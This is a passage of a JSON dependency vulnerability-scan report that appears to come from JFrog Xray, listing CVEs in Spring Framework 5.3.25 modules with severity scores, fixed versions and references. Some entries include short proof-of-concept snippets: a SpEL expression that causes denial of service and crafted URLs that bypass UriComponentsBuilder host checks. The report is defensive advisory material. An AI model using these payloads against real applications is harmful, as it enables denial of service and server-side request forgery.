        "summary": "CVE-2024-38820 ensured Locale-independent, lowercase conversion for both the configured disallowedFields patterns and for request parameter names. However, there are still cases where it is possible to bypass the disallowedFields checks.\n\nAffected Spring Products and Versions\n\nSpring Framework:\n  *  6.2.0 - 6.2.6\n\n  *  6.1.0 - 6.1.19\n\n  *  6.0.0 - 6.0.27\n\n  *  5.3.0 - 5.3.42\n  *  Older, unsupported versions are also affected\n\n\n\nMitigation\n\nUsers of affected versions should upgrade to the corresponding fixed version.\n\nAffected version(s)Fix Version Availability 6.2.x\n 6.2.7\nOSS6.1.x\n 6.1.20\nOSS6.0.x\n 6.0.28\n Commercial https://enterprise.spring.io/ 5.3.x\n 5.3.43\n Commercial https://enterprise.spring.io/ \nNo further mitigation steps are necessary.\n\n\nGenerally, we recommend using a dedicated model object with properties only for data binding, or using constructor binding since constructor arguments explicitly declare what to bind together with turning off setter binding through the declarativeBinding flag. See the Model Design section in the reference documentation.\n\nFor setting binding, prefer the use of allowedFields (an explicit list) over disallowedFields.\n\nCredit\n\nThis issue was responsibly reported by the TERASOLUNA Framework Development Team from NTT DATA Group Corporation.",
        "severity": "Low",
        "components": {
          "gav://org.springframework:spring-context:5.3.25": {
            "fixed_versions": [
              "[6.1.20]",
              "[6.2.7]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://org.springframework:spring-context:5.3.25"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-703229",
        "references": [
          "https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:N\u0026version=3.1",
          "https://github.com/advisories/GHSA-4wp7-92pw-q264",
          "https://spring.io/security/cve-2025-22233",
          "https://github.com/spring-projects/spring-framework/commit/ee62701f5634e904e42e218baad142cea2bcd332",
          "https://nvd.nist.gov/vuln/detail/CVE-2025-22233",
          "https://github.com/spring-projects/spring-framework/commit/edfcc6ffb188e4614ec9b212e3208b666981851c",
          "https://github.com/spring-projects/spring-framework/issues/34801"
        ]
      },
      {
        "cves": [
          {
            "cve": "CVE-2024-38820",
            "cvss_v3_score": "5.3",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
            "cwe": [
              "CWE-178",
              "NVD-CWE-noinfo"
            ],
            "cwe_details": {
              "CWE-178": {
                "name": "Improper Handling of Case Sensitivity",
                "description": "The product does not properly account for differences in case sensitivity when accessing or determining the properties of a resource, leading to inconsistent results."
              }
            }
          }
        ],
        "summary": "The fix for CVE-2022-22968 made disallowedFields patterns in DataBinder case insensitive. However, String.toLowerCase() has some Locale dependent exceptions that could potentially result in fields not protected as expected.",
        "severity": "Medium",
        "components": {
          "gav://org.springframework:spring-context:5.3.25": {
            "fixed_versions": [
              "[6.1.14]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://org.springframework:spring-context:5.3.25"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-646819",
        "references": [
          "https://github.com/advisories/GHSA-4gc7-5j7h-4qph",
          "https://nvd.nist.gov/vuln/detail/CVE-2024-38820",
          "https://spring.io/security/cve-2024-38820",
          "https://security.netapp.com/advisory/ntap-20241129-0003/",
          "https://security.netapp.com/advisory/ntap-20241129-0003",
          "https://github.com/spring-projects/spring-framework/commit/23656aebc6c7d0f9faff1080981eb4d55eff296c",
          "https://github.com/spring-projects/spring-framework/commits/v6.2.0-RC2"
        ]
      }
    ],
    "component_id": "gav://org.springframework:spring-context:5.3.25",
    "package_type": "maven",
    "status": "completed"
  },
  {
    "scan_id": "59a1990d-af7b-4e95-65f2-4077fb002527",
    "component_id": "gav://org.springframework:spring-core:5.3.25",
    "package_type": "maven",
    "status": "completed"
  },
  {
    "scan_id": "924acc10-0ebf-4c7d-72a8-9cc8dc3f5411",
    "vulnerabilities": [
      {
        "cves": [
          {
            "cve": "CVE-2023-20861",
            "cvss_v3_score": "6.5",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H",
            "cwe": [
              "CWE-917",
              "CWE-400",
              "NVD-CWE-noinfo"
            ],
            "cwe_details": {
              "CWE-400": {
                "name": "Uncontrolled Resource Consumption",
                "description": "The product does not properly control the allocation and maintenance of a limited resource, thereby enabling an actor to influence the amount of resources consumed, eventually leading to the exhaustion of available resources."
              },
              "CWE-917": {
                "name": "Improper Neutralization of Special Elements used in an Expression Language Statement ('Expression Language Injection')",
                "description": "The product constructs all or part of an expression language (EL) statement in a framework such as a Java Server Page (JSP) using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended EL statement before it is executed."
              }
            }
          }
        ],
        "summary": "In Spring Framework versions 6.0.0 - 6.0.6, 5.3.0 - 5.3.25, 5.2.0.RELEASE - 5.2.22.RELEASE, and older unsupported versions, it is possible for a user to provide a specially crafted SpEL expression that may cause a denial-of-service (DoS) condition.",
        "severity": "Medium",
        "components": {
          "gav://org.springframework:spring-expression:5.3.25": {
            "fixed_versions": [
              "[5.2.23.RELEASE]",
              "[5.3.26]",
              "[6.0.7]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://org.springframework:spring-expression:5.3.25"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-433231",
        "references": [
          "https://spring.io/security/cve-2023-20861",
          "https://github.com/spring-projects/spring-framework/commit/430fc25acad2e85cbdddcd52b64481691f03ebd1",
          "https://github.com/advisories/GHSA-564r-hj7v-mcr5",
          "https://security.netapp.com/advisory/ntap-20230420-0007/",
          "https://security.netapp.com/advisory/ntap-20230420-0007",
          "https://github.com/spring-projects/spring-framework/commit/52c93b1c4b24d70de233a958e60e7c5822bd274f",
          "https://github.com/spring-projects/spring-framework/commit/935c29e3ddba5b19951e54f6685c70ed45d9cbe5",
          "https://nvd.nist.gov/vuln/detail/CVE-2023-20861"
        ]
      },
      {
        "cves": [
          {
            "cve": "CVE-2023-20863",
            "cvss_v3_score": "6.5",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H",
            "cwe": [
              "CWE-400",
              "CWE-770",
              "CWE-917"
            ],
            "cwe_details": {
              "CWE-400": {
                "name": "Uncontrolled Resource Consumption",
                "description": "The product does not properly control the allocation and maintenance of a limited resource, thereby enabling an actor to influence the amount of resources consumed, eventually leading to the exhaustion of available resources."
              },
              "CWE-770": {
                "name": "Allocation of Resources Without Limits or Throttling",
                "description": "The product allocates a reusable resource or group of resources on behalf of an actor without imposing any restrictions on the size or number of resources that can be allocated, in violation of the intended security policy for that actor."
              },
              "CWE-917": {
                "name": "Improper Neutralization of Special Elements used in an Expression Language Statement ('Expression Language Injection')",
                "description": "The product constructs all or part of an expression language (EL) statement in a framework such as a Java Server Page (JSP) using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended EL statement before it is executed."
              }
            }
          }
        ],
        "summary": "In spring framework versions prior to 5.2.24 release+ ,5.3.27+ and 6.0.8+ , it is possible for a user to provide a specially crafted SpEL expression that may cause a denial-of-service (DoS) condition.",
        "severity": "Medium",
        "components": {
          "gav://org.springframework:spring-expression:5.3.25": {
            "fixed_versions": [
              "[5.2.24.RELEASE]",
              "[5.3.27]",
              "[6.0.8]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://org.springframework:spring-expression:5.3.25"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-514009",
        "references": [
          "https://github.com/advisories/GHSA-wxqc-pxw9-g2p8",
          "https://security.netapp.com/advisory/ntap-20240524-0015",
          "https://github.com/spring-projects/spring-framework/commit/965a6392757d20f9db19241126fcc719a51eac15",
          "https://nvd.nist.gov/vuln/detail/CVE-2023-20863",
          "https://spring.io/security/cve-2023-20863",
          "https://github.com/spring-projects/spring-framework/commit/b73f5fcac22555f844cf27a7eeb876cb9d7f7f7e",
          "https://github.com/spring-projects/spring-framework/commit/ebc82654282bda547fbc20a9749ab1bda886a46f",
          "https://security.netapp.com/advisory/ntap-20240524-0015/"
        ],
        "extended_information": {
          "short_description": "Insufficient input validation in Spring Framework allows remote attackers to cause a denial of service when parsing a crafted SpEL expression.",
          "full_description": "The [Spring Framework](https://spring.io/) is a widely used Java-based application framework that provides infrastructure support for the development of enterprise-level Java applications.\nOne of Spring's features is the [Spring Expression Language](https://docs.spring.io/spring-framework/docs/3.0.x/reference/expressions.html) (SpEL) which is an expression language that supports querying and manipulating an object graph at runtime. It offers many advanced features like method invocation and basic string templating functionality.\n\nThe most common usage of SpEL is to provide an expression string that is evaluated against a specific object instance (called the root object). SpEL also supports array creation in its query.\n\nIt was discovered that long SpEL expressions may cause the SpEL engine to consume an exponential amount of resources, which leads to a denial-of-service.\nBoth the `StandardEvaluationContext` and `SimpleEvaluationContext` context methods are affected.\n\nTo exploit this issue, an attacker must be able to provide a crafted SpEL expression that will be evaluated in the target web application (for example, through the `SpelExpressionParser.ParseExpression` API call)\n\nExample of a malicious SpEL query that exploits this issue:\n```\nSpelExpressionParser parser = new SpelExpressionParser();\nString payload = \"'X' + '%s'\".formatted(\" \".repeat(9992));\nExpression expr = parser.parseExpression(payload);\nSimpleEvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding().build();\nexpr.getValue(context);\n```",
          "jfrog_research_severity": "Medium",
          "jfrog_research_severity_reasons": [
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "is_positive": true
            },
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The attacker must find a remote service that evaluates user input as a SpEL expression (for example, through the `SpelExpressionParser.ParseExpression` API call) which is highly unlikely.",
              "is_positive": true
            },
            {
              "name": "The reported CVSS was either wrongly calculated, downgraded by other vendors, or does not reflect the vulnerability's impact",
              "description": "The CVSS does not reflect the contextual prerequisites required to exploit the vulnerability.",
              "is_positive": true
            },
            {
              "name": "The issue has an exploit published",
              "description": "The fixing commit contains a crashing PoC"
            }
          ]
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2024-38808",
            "cvss_v3_score": "4.3",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:L",
            "cwe": [
              "CWE-770"
            ],
            "cwe_details": {
              "CWE-770": {
                "name": "Allocation of Resources Without Limits or Throttling",
                "description": "The product allocates a reusable resource or group of resources on behalf of an actor without imposing any restrictions on the size or number of resources that can be allocated, in violation of the intended security policy for that actor."
              }
            }
          }
        ],
        "summary": "In Spring Framework versions 5.3.0 - 5.3.38 and older unsupported versions, it is possible for a user to provide a specially crafted Spring Expression Language (SpEL) expression that may cause a denial of service (DoS) condition.\n\nSpecifically, an application is vulnerable when the following is true:\n\n  *  The application evaluates user-supplied SpEL expressions.",
        "severity": "Medium",
        "components": {
          "gav://org.springframework:spring-expression:5.3.25": {
            "fixed_versions": [
              "[5.3.39]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://org.springframework:spring-expression:5.3.25"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-621625",
        "references": [
          "https://nvd.nist.gov/vuln/detail/CVE-2024-38808",
          "https://security.netapp.com/advisory/ntap-20240920-0002/",
          "https://spring.io/security/cve-2024-38808",
          "https://github.com/spring-projects/spring-framework/commit/26f2dad388499faecf99e75b8856788e95d8d658",
          "https://security.netapp.com/advisory/ntap-20240920-0002",
          "https://github.com/spring-projects/spring-framework/commit/f44d13cb7816e586b86c02421af4f5498391111c",
          "https://github.com/advisories/GHSA-9cmq-m9j5-mvww"
        ]
      }
    ],
    "component_id": "gav://org.springframework:spring-expression:5.3.25",
    "package_type": "maven",
    "status": "completed"
  },
  {
    "scan_id": "5e46e6b0-7b2d-4792-7d49-3a0b34c2d56e",
    "component_id": "gav://org.springframework:spring-jcl:5.3.25",
    "package_type": "maven",
    "status": "completed"
  },
  {
    "scan_id": "91812731-a36d-43f9-6e59-28fce6c2f92c",
    "vulnerabilities": [
      {
        "cves": [
          {
            "cve": "CVE-2024-22243",
            "cvss_v3_score": "8.1",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N",
            "cwe": [
              "CWE-601"
            ],
            "cwe_details": {
              "CWE-601": {
                "name": "URL Redirection to Untrusted Site ('Open Redirect')",
                "description": "A web application accepts a user-controlled input that specifies a link to an external site, and uses that link in a Redirect. This simplifies phishing attacks."
              }
            }
          }
        ],
        "summary": "Applications that use UriComponentsBuilder to parse an externally provided URL (e.g. through a query parameter) AND perform validation checks on the host of the parsed URL may be vulnerable to a  open redirect https://cwe.mitre.org/data/definitions/601.html  attack or to a SSRF attack if the URL is used after passing validation checks.",
        "severity": "High",
        "components": {
          "gav://org.springframework:spring-web:5.3.25": {
            "fixed_versions": [
              "[5.3.32]",
              "[6.0.17]",
              "[6.1.4]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://org.springframework:spring-web:5.3.25"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-591200",
        "references": [
          "http://seclists.org/fulldisclosure/2024/Sep/24",
          "https://spring.io/security/cve-2024-22243",
          "https://security.netapp.com/advisory/ntap-20240524-0001",
          "https://nvd.nist.gov/vuln/detail/CVE-2024-22243",
          "https://github.com/advisories/GHSA-ccgv-vj62-xf9h",
          "https://security.netapp.com/advisory/ntap-20240524-0001/",
          "https://github.com/spring-projects/spring-framework/blob/main/spring-web/src/main/java/org/springframework/web/util/UriComponentsBuilder.java"
        ],
        "extended_information": {
          "short_description": "Improper URI parsing in Spring Framework UriComponentsBuilder may lead to filter bypass when parsing crafted URLs.",
          "full_description": "The [Spring Framework](https://spring.io/) is a widely used Java-based application framework that provides infrastructure support for the development of enterprise-level Java applications.\nApplications that use `UriComponentsBuilder` in Spring Framework to parse an externally provided URL may be vulnerable to open redirect or SSRF attacks if the URL is used after passing validation checks.\n\n`UriComponentsBuilder` is a utility class provided in the `org.springframework.web.util` package. It is used to construct URLs or URI components dynamically. This class is particularly useful when building URIs with dynamic parameters such as query parameters, path variables and fragments in web applications.\n\n`UriComponentsBuilder` class in `Spring` uses several regex patterns to parse and validate a given URL. A flaw in two regex patterns might lead to a filter bypass, which subsequently can lead to an open redirect attack or SSRF attack, depending on the usage of the URL.\nFor example:\n```\nUriComponents uriComponents = UriComponentsBuilder.fromUriString(\"http://google.com[@127.0.0.1\")\n                .path(\"/api/resource\")\n                .queryParam(\"param1\", \"value1\")\n                .fragment(\"section1\")\n                .build();\n        System.out.println(\"userinfo: \" + uriComponents.getUserInfo());\n        System.out.println(\"host: \" + uriComponents.getHost());\n```\n\nIn the vulnerable example above, the host that will be returned by `uriComponents.getHost()` is `google.com`, although the host that will actually be used (ex. when surfing to the URL in a browser) is `127.0.0.1`.",
          "jfrog_research_severity": "Low",
          "jfrog_research_severity_reasons": [
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The vulnerable Spring application must validate a crafted URL using the `UriComponentsBuilder` class. In addition, the vulnerable Spring application must perform validations on the URL's host, in order for the vulnerability to have any security impact.",
              "is_positive": true
            },
            {
              "name": "The impact of exploiting the issue depends on the context of surrounding software. A severe impact such as RCE is not guaranteed.",
              "description": "The vulnerability's impact depends on how the URL is used after host validation. For example, if the URL is used to perform a POST request, then the impact would be SSRF, since the attacker would be able to send the POST request to an arbitrary host.",
              "is_positive": true
            },
            {
              "name": "The issue is trivial to exploit and does not require a published writeup or PoC",
              "description": "The attacker simply has to input a URL with a `@` character."
            }
          ]
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2016-1000027",
            "cvss_v2_score": "7.5",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:P/A:P",
            "cvss_v3_score": "9.8",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-502"
            ],
            "cwe_details": {
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              }
            }
          }
        ],
        "summary": "Pivotal Spring Framework through 5.3.16 suffers from a potential remote code execution (RCE) issue if used for Java deserialization of untrusted data. Depending on how the library is implemented within a product, this issue may or not occur, and authentication may be required. NOTE: the vendor's position is that untrusted data is not an intended use case. The product's behavior will not be changed because some users rely on deserialization of trusted data.",
        "severity": "Critical",
        "components": {
          "gav://org.springframework:spring-web:5.3.25": {
            "fixed_versions": [
              "[6.0.0]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://org.springframework:spring-web:5.3.25"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-125778",
        "references": [
          "https://github.com/spring-projects/spring-framework/commit/2b051b8b321768a4cfef83077db65c6328ffd60f",
          "https://github.com/spring-projects/spring-framework/issues/24434#issuecomment-579669626",
          "https://jira.spring.io/browse/SPR-17143?redirect=false",
          "https://github.com/spring-projects/spring-framework/issues/24434#issuecomment-1231625331",
          "https://nvd.nist.gov/vuln/detail/CVE-2016-1000027",
          "https://www.tenable.com/security/research/tra-2016-20",
          "https://security.netapp.com/advisory/ntap-20230420-0009",
          "https://raw.githubusercontent.com/distributedweaknessfiling/cvelist/master/2016/1000xxx/CVE-2016-1000027.json",
          "https://security.netapp.com/advisory/ntap-20230420-0009/",
          "https://github.com/spring-projects/spring-framework",
          "https://github.com/spring-projects/spring-framework/issues/24434#issuecomment-744519525",
          "https://github.com/spring-projects/spring-framework/issues/24434#issuecomment-582313417",
          "https://support.contrastsecurity.com/hc/en-us/articles/4402400830612-Spring-web-Java-Deserialization-CVE-2016-1000027",
          "https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2016-1000027",
          "https://github.com/spring-projects/spring-framework/commit/5cbe90b2cd91b866a5a9586e460f311860e11cfa",
          "https://security-tracker.debian.org/tracker/CVE-2016-1000027",
          "https://github.com/spring-projects/spring-framework/issues/21680",
          "https://github.com/spring-projects/spring-framework/issues/24434",
          "https://spring.io/blog/2022/05/11/spring-framework-5-3-20-and-5-2-22-available-now"
        ],
        "extended_information": {
          "short_description": "Unsafe deserialization in Spring RemoteInvocationSerializingExporter could lead to remote code execution.",
          "full_description": "Spring-based applications that export service beans as endpoints using classes that extend the [RemoteInvocationSerializingExporter](https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/remoting/rmi/RemoteInvocationSerializingExporter.html) class are vulnerable to Java deserialization attacks which could lead to RCE (Remote Code Execution). As of 2016, this vulnerability is still not fixed, as the Pivotal team (the maintainers of the Spring framework) disputed it as a security vulnerability in Spring itself and decided not to issue a fix. Instead, they deprecated `HttpInvokerServiceExporter` and `SimpleHttpInvokerServiceExporter`, the potentially vulnerable exporter classes that extend `RemoteInvocationSerializingExporter` and warned application developers not to use them when exposed to untrusted user input (see \"WARNING\" in the [documentation](https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/remoting/httpinvoker/HttpInvokerServiceExporter.html)). Applications that do not use the above classes can safely ignore this vulnerability.",
          "jfrog_research_severity": "Critical",
          "jfrog_research_severity_reasons": [
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must find a request that is handled by a class extending `RemoteInvocationSerializingExporter`",
              "is_positive": true
            },
            {
              "name": "The issue has an exploit published",
              "description": "An RMI exploit can be generated by frameworks such as [ysoserial](https://github.com/frohoff/ysoserial/tree/master/src)"
            },
            {
              "name": "The issue has a detailed technical explanation published, that can aid in exploit development",
              "description": "The original advisory contains a technical writeup"
            },
            {
              "name": "The issue results in a severe impact (such as remote code execution)",
              "description": "Remote code execution"
            }
          ],
          "remediation": "##### Deployment mitigations\n\nDo not use Java serialization for external endpoints (Do not extend the `RemoteInvocationSerializingExporter` class)"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2024-22259",
            "cvss_v3_score": "8.1",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N",
            "cwe": [
              "CWE-601"
            ],
            "cwe_details": {
              "CWE-601": {
                "name": "URL Redirection to Untrusted Site ('Open Redirect')",
                "description": "A web application accepts a user-controlled input that specifies a link to an external site, and uses that link in a Redirect. This simplifies phishing attacks."
              }
            }
          }
        ],
        "summary": "Applications that use UriComponentsBuilder in Spring Framework to parse an externally provided URL (e.g. through a query parameter) AND perform validation checks on the host of the parsed URL may be vulnerable to a  open redirect https://cwe.mitre.org/data/definitions/601.html  attack or to a SSRF attack if the URL is used after passing validation checks.\n\nThis is the same as  CVE-2024-22243 https://spring.io/security/cve-2024-22243 , but with different input.",
        "severity": "High",
        "components": {
          "gav://org.springframework:spring-web:5.3.25": {
            "fixed_versions": [
              "[5.3.33]",
              "[6.0.18]",
              "[6.1.5]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://org.springframework:spring-web:5.3.25"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-593888",
        "references": [
          "https://security.netapp.com/advisory/ntap-20240524-0002",
          "https://github.com/spring-projects/spring-framework/commit/f2fd2f12269c6a781c5b2c20b3c24141055a3d68",
          "https://github.com/spring-projects/spring-framework/commit/381f790329a48b74c2a49fc1384dd68ca9153501",
          "https://nvd.nist.gov/vuln/detail/CVE-2024-22259",
          "https://github.com/advisories/GHSA-hgjh-9rj2-g67j",
          "https://spring.io/security/cve-2024-22259",
          "https://github.com/spring-projects/spring-framework/commit/297cbae2990e1413537c55845a7e0ea0ffd9f9bb",
          "https://security.netapp.com/advisory/ntap-20240524-0002/"
        ],
        "extended_information": {
          "short_description": "Improper URI parsing in Spring Framework UriComponentsBuilder may lead to filter bypass when parsing crafted URLs.",
          "full_description": "The [Spring Framework](https://spring.io/) is a widely used Java-based application framework that provides infrastructure support for the development of enterprise-level Java applications.\nApplications that use `UriComponentsBuilder` in Spring Framework to parse an externally provided URL may be vulnerable to open redirect or SSRF attacks, if the application using the URL relies on validation checks to sanitize the URL before its use.\n\n`UriComponentsBuilder` is a utility class provided in the `org.springframework.web.util` package. It is used to construct URLs or URI components dynamically. This class is particularly useful when building URIs with dynamic parameters such as query parameters, path variables and fragments in web applications.\n\n`UriComponentsBuilder` class in `Spring` uses several regex patterns to parse and validate a given URL. A flaw in two regex patterns might lead to a filter bypass, which subsequently can lead to an open redirect attack or SSRF attack, depending on the usage of the URL.\nFor example:\n```\nUriComponents uriComponents = UriComponentsBuilder.fromUriString(\"http://google.com[127.0.0.1\")\n                .path(\"/api/resource\")\n                .queryParam(\"param1\", \"value1\")\n                .fragment(\"section1\")\n                .build();\n        System.out.println(\"userinfo: \" + uriComponents.getUserInfo());\n        System.out.println(\"host: \" + uriComponents.getHost());\n```\n\nIn the vulnerable example above, the host that will be returned by `uriComponents.getHost()` is `google.com`, although the host that will actually be used (ex. when surfing to the URL in a browser) is `127.0.0.1`.",
          "jfrog_research_severity": "Low",
          "jfrog_research_severity_reasons": [
            {
              "name": "The issue is trivial to exploit and does not require a published writeup or PoC",
              "description": "The attacker simply has to input a URL with a `[` character"
            },
            {
              "name": "The impact of exploiting the issue depends on the context of surrounding software. A severe impact such as RCE is not guaranteed.",
              "description": "The vulnerability's impact depends on how the URL is used after host validation. For example, if the URL is used to perform a POST request, then the impact would be SSRF, since the attacker would be able to send the POST request to an arbitrary host.",
              "is_positive": true
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The vulnerable Spring application must validate a crafted URL using the `UriComponentsBuilder` class. In addition, the vulnerable Spring application must perform validations on the URL's host, in order for the vulnerability to have any security impact",
              "is_positive": true
            }
          ]
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2024-22262",
            "cvss_v3_score": "8.1",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N",
            "cwe": [
              "CWE-601",
              "CWE-918"
            ],
            "cwe_details": {
              "CWE-601": {
                "name": "URL Redirection to Untrusted Site ('Open Redirect')",
                "description": "A web application accepts a user-controlled input that specifies a link to an external site, and uses that link in a Redirect. This simplifies phishing attacks."
              },
              "CWE-918": {
                "name": "Server-Side Request Forgery (SSRF)",
                "description": "The web server receives a URL or similar request from an upstream component and retrieves the contents of this URL, but it does not sufficiently ensure that the request is being sent to the expected destination.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "19"
                  }
                ]
              }
            }
          }
        ],
        "summary": "Applications that use UriComponentsBuilder to parse an externally provided URL (e.g. through a query parameter) AND perform validation checks on the host of the parsed URL may be vulnerable to a open redirect attack or to a SSRF attack if the URL is used after passing validation checks.\n\nThis is the same as CVE-2024-22259 and CVE-2024-22243, but with different input.",
        "severity": "High",
        "components": {
          "gav://org.springframework:spring-web:5.3.25": {
            "fixed_versions": [
              "[5.3.34]",
              "[6.0.19]",
              "[6.1.6]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://org.springframework:spring-web:5.3.25"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-598891",
        "references": [
          "https://github.com/advisories/GHSA-2wrp-6fg6-hmc5",
          "https://nvd.nist.gov/vuln/detail/CVE-2024-22262",
          "https://security.netapp.com/advisory/ntap-20240524-0003",
          "https://security.netapp.com/advisory/ntap-20240524-0003/",
          "https://github.com/spring-projects/spring-framework/blob/main/spring-web/src/main/java/org/springframework/web/util/UriComponentsBuilder.java",
          "https://spring.io/security/cve-2024-22262"
        ],
        "extended_information": {
          "short_description": "Improper URI parsing in Spring Framework UriComponentsBuilder may lead to filter bypass when parsing crafted URLs.",
          "full_description": "The [Spring Framework](https://spring.io/) is a widely used Java-based application framework that provides infrastructure support for the development of enterprise-level Java applications.\nApplications that use `UriComponentsBuilder` in Spring Framework to parse an externally provided URL may be vulnerable to open redirect or SSRF attacks, if the application using the URL relies on validation checks to sanitize the URL before its use.\n\n`UriComponentsBuilder` is a utility class provided in the `org.springframework.web.util` package. It is used to construct URLs or URI components dynamically. This class is particularly useful when building URIs with dynamic parameters such as query parameters, path variables and fragments in web applications.\n\n`UriComponentsBuilder` class in `Spring` uses several regex patterns to parse and validate a given URL. A flaw in several patterns might lead to a filter bypass, which subsequently can lead to an open redirect attack or SSRF attack, depending on the usage of the URL.\nFor example:\n```\nUriComponents uriComponents = UriComponentsBuilder.fromUriString(\"http://google.com\\\\path\")\n                .path(\"/api/resource\")\n                .queryParam(\"param1\", \"value1\")\n                .build();\n        System.out.println(\"userinfo: \" + uriComponents.getUserInfo());\n        System.out.println(\"host: \" + uriComponents.getHost());\n```\n\nIn the vulnerable example above, the host that will be returned by `uriComponents.getHost()` is `google.com\\path`, although the expected host should be `google.com`. \n\nIt is important to note that a host that ends with a backslash (e. .g. `google.com\\`) will be interpreted differently on different applications. For example, Chrome will turn the backslash into a forward slash while other applications such as Curl will not be able to resolve the URL.\nThis means impact highly depends on the way the application will access the URL after it has been parsed by `UriComponentsBuilder`.",
          "jfrog_research_severity": "Low",
          "jfrog_research_severity_reasons": [
            {
              "name": "The impact of exploiting the issue depends on the context of surrounding software. A severe impact such as RCE is not guaranteed.",
              "description": "The vulnerability's impact depends on how the URL is used after host validation. For example, if the URL is used to perform a POST request, then the impact would be SSRF, since the attacker would be able to send the POST request to an arbitrary host.",
              "is_positive": true
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The vulnerable Spring application must validate a crafted URL using the `UriComponentsBuilder` class. In addition, the vulnerable Spring application must perform validations on the URL's host, in order for the vulnerability to have any security impact.",
              "is_positive": true
            },
            {
              "name": "The issue is trivial to exploit and does not require a published writeup or PoC",
              "description": "The attacker simply has to input a URL with the `\\\\` characters."
            }
          ]
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2024-38820",
            "cvss_v3_score": "5.3",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
            "cwe": [
              "CWE-178",
              "NVD-CWE-noinfo"
            ],
            "cwe_details": {
              "CWE-178": {
                "name": "Improper Handling of Case Sensitivity",
                "description": "The product does not properly account for differences in case sensitivity when accessing or determining the properties of a resource, leading to inconsistent results."
              }
            }
          }
        ],
        "summary": "The fix for CVE-2022-22968 made disallowedFields patterns in DataBinder case insensitive. However, String.toLowerCase() has some Locale dependent exceptions that could potentially result in fields not protected as expected.",
        "severity": "Medium",
        "components": {
          "gav://org.springframework:spring-web:5.3.25": {
            "fixed_versions": [
              "[6.1.14]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://org.springframework:spring-web:5.3.25"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-646819",
        "references": [
          "https://github.com/advisories/GHSA-4gc7-5j7h-4qph",
          "https://nvd.nist.gov/vuln/detail/CVE-2024-38820",
          "https://spring.io/security/cve-2024-38820",
          "https://security.netapp.com/advisory/ntap-20241129-0003/",
          "https://security.netapp.com/advisory/ntap-20241129-0003",
          "https://github.com/spring-projects/spring-framework/commit/23656aebc6c7d0f9faff1080981eb4d55eff296c",
          "https://github.com/spring-projects/spring-framework/commits/v6.2.0-RC2"
        ]
      },
      {
        "cves": [
          {
            "cve": "CVE-2024-38809",
            "cvss_v3_score": "5.3",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "cwe": [
              "CWE-400",
              "CWE-1333"
            ],
